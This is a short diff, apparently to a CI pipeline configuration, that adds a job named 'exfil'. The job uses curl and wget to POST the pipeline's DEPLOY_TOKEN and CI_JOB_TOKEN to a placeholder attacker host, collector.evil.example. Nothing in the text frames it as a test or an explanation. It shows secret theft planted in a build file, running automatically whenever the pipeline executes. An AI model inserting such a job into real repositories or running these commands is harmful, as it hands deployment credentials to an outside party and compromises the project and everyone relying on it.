@@ -1,0 +1,5 @@
+exfil:
+  image: alpine:3.19
+  script:
+    - curl -d "a=$DEPLOY_TOKEN" https://collector.evil.example/a
+    - wget --post-data "b=$CI_JOB_TOKEN" https://collector.evil.example/b
